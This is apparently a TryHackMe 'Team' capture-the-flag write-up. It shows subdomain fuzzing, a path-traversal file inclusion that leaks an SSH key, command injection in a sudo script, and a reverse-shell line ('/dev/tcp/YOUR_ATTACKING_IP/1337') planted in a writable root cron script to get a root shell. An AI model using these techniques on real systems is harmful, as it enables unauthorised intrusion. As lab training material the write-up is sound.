# Teamfinal

[Play](https://tryhackme.com/room/teamcw)

## Recon

As usual, we start off with `nmap` and `gobuster` scans. 

`❯ nmap -sC -sV -A 10.10.82.31`

`❯ gobuster dir -u 10.10.82.31 -w "/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt" -x "html,php,txt"`

While they run, let's check out the webpage itself. Looks like the default page.

![](https://i.imgur.com/YFJ7Hhw.png)

We see two things: that bug and the `team.thm` thing. The bug link is nothing special. Let's add `team.thm` to our host list. 

```
❯ sudo vim /etc/hosts
❯ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.10.82.31     team.thm
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

```
❯ nmap -sC -sV -A 10.10.82.31
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-09 23:36 EST
Nmap scan report for 10.10.82.31
Host is up (0.35s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 79:5f:11:6a:85:c2:08:24:30:6c:d4:88:74:1b:79:4d (RSA)
|   256 af:7e:3f:7e:b4:86:58:83:f1:f6:a2:54:a6:9b:ba:ad (ECDSA)
|_  256 26:25:b0:7b:dc:3f:b2:94:37:12:5d:cd:06:98:c7:9f (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works! If you see this add 'te...
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.96 seconds
```
`nmap` is finished, and we can kill `gobuster` scan; since it does not look any useful.

===

![](https://i.imgur.com/OT9fQyi.png)

Ah. we see a proper page up here. Looking at the source, we see `/assets` and `/images`. I don't like stego challenges, so I'll keep it for the end.

Let's fire up `gobuster` again, on `team.thm` this time. While that runs, I tried looking around in the website, but nothing special. Same goes for trying out `anonymous` login in `ftp`. `searchsploit` did not return anything intersting either. 

I've also learnt that this domain may not be the only one; we should look for subdomains as well. I will use `wfuzz`. Since this is the first time I'm mentioning this, I'll explain all the flags as well :P

```
❯ wfuzz -c --hw 977 -w /usr/share/wfuzz/wordlist/general/common.txt -u http://team.thm/ -H "Host: FUZZ.team.thm" --hc 400
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://team.thm/
Total requests: 951

=====================================================================
ID           Response   Lines    Word       Chars       Payload       
=====================================================================

000000257:   200        9 L      20 W       187 Ch      "dev"         
000000936:   200        89 L     220 W      2966 Ch     "www"         

Total time: 36.97936
Processed Requests: 951
Filtered Requests: 949
Requests/sec.: 25.71704
```

The results look nice. Okay. One by one.

- `-c` flag is for colorful output
- `--hw` stands for `hide words`, probably. It was showing a ton of rows with `977`, so I hardcoded :D
- `-w` wordlist. If you are in kali, you already have it in `/usr/share/wfuzz/wordlist/general/common.txt`.
- `-u` url
- `-H` host name. `FUZZ` gets replaced by the `Payload`.
- `--hc` hides responses having `400` error.

Also, from `gobuster`, we have this uptill now.

```
❯ gobuster dir -u team.thm -w "/usr/share/dirbustrectory-list-2.3-medium.txt" -x "html,php,txt"
=================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer
=================================================
[+] Url:            http://team.thm
[+] Threads:        10
[+] Wordlist:       /usr/share/dirbuster/wordlistt-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,php,txt
[+] Timeout:        10s
=================================================
2021/03/09 23:44:28 Starting gobuster
=================================================
/index.html (Status: 200)
/images (Status: 301)
/scripts (Status: 301)
/assets (Status: 301)
/robots.txt (Status: 200)
```

Interesting times. `scripts` I can't access, so i'll leave it be. We can run another `gobuster` on `team.thm/scripts`, but that is for later. `robots.txt` is always interesting.

![](https://i.imgur.com/0u3oCyW.png)

Is what is shows. Lmao. Probably the `ftp` username? Password we can bruteforce. This is another thing we can try.

Pending paths:
- images stego
- gobuster on `/scripts`
- bruteforce `ftp` using `dale` as username.
 
However, there are tastier things for us right now. Let's go to `dev.team.thm` from the `wfuzz` results. Do not forget to include it in `/etc/hosts`!

![](https://i.imgur.com/L0mKUUj.png)

Huh. Let's follow that. It redirects us to the url: `http://dev.team.thm/script.php?page=teamshare.php`

![](https://i.imgur.com/wnQJ8Ns.png)


Both of these ideas combined, this looks very much like a `LFI`. Let's try `http://dev.team.thm/script.php?page=../../../../etc/passwd`. Since the Apache server is usually around `/var/www/html/`.

![](https://i.imgur.com/AAdqDXG.png)


Works! We see `dale`, `gyles` and some `ftpuser`. Interesting. Our first target is then to get into `dale`.

## Foothold

Okay. Since there was a `ssh` port open, we can assume `dale` is the username of that (It could be for `ftp` as well, who knows!).

So, we are looking for either the password of dale, or a private key. Since we have no better option currently, we can bruteforce paths using `burpsuite`. Turn on `foxy-proxy` or any other tool you use, and fire up `burp`.

Intercept a request, copypaste it. It looks like

```
GET /script.php?page=../../../../etc/passwd HTTP/1.1

Host: dev.team.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

Now, go to the `intruder` tab, and setup as the following:

![](https://i.imgur.com/JfUKF2w.png)

![](https://i.imgur.com/A9qcD6D.png)

![](https://i.imgur.com/HgfY6eP.png)

I've put in the payload from [here](https://raw.githubusercontent.com/hussein98d/LFI-files/master/list.txt)

Now, you can let it run, but community edition sucks for this. Speed is shit and the thing we are looking for, is towards the bottom of the list. Let me save you some trouble, the path we are looking for, is `/etc/ssh/sshd_config`. The url thus being `http://dev.team.thm/script.php?page=../../../../etc/ssh/sshd_config`

![](https://i.imgur.com/UZN47TX.png)

We see the sweet sweet private key, which means we can get in! Since the formatting is shit, go the source and the copy-paste it. Yeet all the '#' in the starting. 

We are in! 

```
❯ ssh dale@10.10.82.31 -i temp
Last login: Mon Jan 18 10:51:32 2021
dale@TEAM:~$ ls
user.txt
dale@TEAM:~$ cat user.txt
THM{HELL YEAH}
```

We are done!

## Priv Esc

Okay! So the first thing I have learnt to do is check for `sudo` details.

```
dale@TEAM:~$ sudo -l
Matching Defaults entries for dale on TEAM:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dale may run the following commands on TEAM:
    (gyles) NOPASSWD: /home/gyles/admin_checks
```

Looks good. Let's head over to there and see what we can mess with.

```
dale@TEAM:/home/gyles$ cat admin_checks 
#!/bin/bash

printf "Reading stats.\n"
sleep 1
printf "Reading stats..\n"
sleep 1
read -p "Enter name of person backing up the data: " name
echo $name  >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null

date_save=$(date "+%F-%H-%M")
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak

printf "Stats have been backed up\n"
```

This is clearly a `bash` script, and those `$name` and `$error` variables look interesting.

```
dale@TEAM:/home/gyles$ sudo -u gyles /home/gyles/admin_checks
Reading stats.
Reading stats..
Enter name of person backing up the data: /bin/bash
Enter 'date' to timestamp the file: /bin/bash
The Date is ls
admin_checks
whoami
gyles
```

Note how I've snuck in `/bin/bash` so that `$error` reads and executes that! Let's also get a proper shell.

```
python3 --version
Python 3.6.5
python3 -c "import pty; pty.spawn('/bin/bash')"
gyles@TEAM:/home/gyles$ 
```

Nice. Now, we are done with lateral privesc. Time for `linpeas.sh`! `scp` the file over to the machine.

```
❯ scp -i path/to/id_rsa /path/to/linpeas.sh dale@10.10.153.126:~
linpeas.sh                    100%  313KB 155.7KB/s   00:02    
```

```
[+] Systemd PATH
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths                                     
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

```
[+] Searching ssl/ssh files
/home/gyles/.ssh/known_hosts                                    
PermitRootLogin without-password
PubkeyAuthentication yes
ChallengeResponseAuthentication no
UsePAM no
Possible private SSH keys were found!
/etc/ssh/sshd_config
  --> Some certificates were found (out limited):
/var/lib/lxd/server.crt
/etc/pollinate/entropy.ubuntu.com.pem

 --> /etc/hosts.allow file found, read the rules:
/etc/hosts.allow
```

The `sshd_config` lmao.


```
[+] .sh files in path
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path                                         
/usr/local/sbin/dev_backup.sh                                   
You can write script: /usr/local/bin/main_backup.sh
/usr/bin/gettext.sh
```

```
[+] Interesting GROUP writable files (not in Home) (max 500)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                                  
  Group gyles:                                                  
/home/gyles/.local                                              
  Group editors:
/var/stats/stats.txt                                            
  Group admin:
/usr/local/bin                                                  
/usr/local/bin/main_backup.sh
/opt/admin_stuff
```

The last two look the most interesting of the scan results.

```
gyles@TEAM:/usr/local/bin$ cat main_backup.sh 
#!/bin/bash
cp -r /var/www/team.thm/* /var/backups/www/team.thm/
```

Oh baby, this is too easy! Since we have the write access, let's have an interactive bash shell pop up here, and we can connect using `nc` from the other side. Hell yeah.

```
gyles@TEAM:/usr/local/bin$ cat main_backup.sh 
#!/bin/bash
cp -r /var/www/team.thm/* /var/backups/www/team.thm/
bash -i >& /dev/tcp/YOUR_ATTACKING_IP/1337 0>&1
```

```
❯ nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.8.150.214] from (UNKNOWN) [10.10.153.126] 37192
bash: cannot set terminal process group (25073): Inappropriate ioctl for device
bash: no job control in this shell
root@TEAM:~# cat /root/root.txt
cat /root/root.txt
THM{YEEEEEEEEEEEEEE}
```

And we are done!

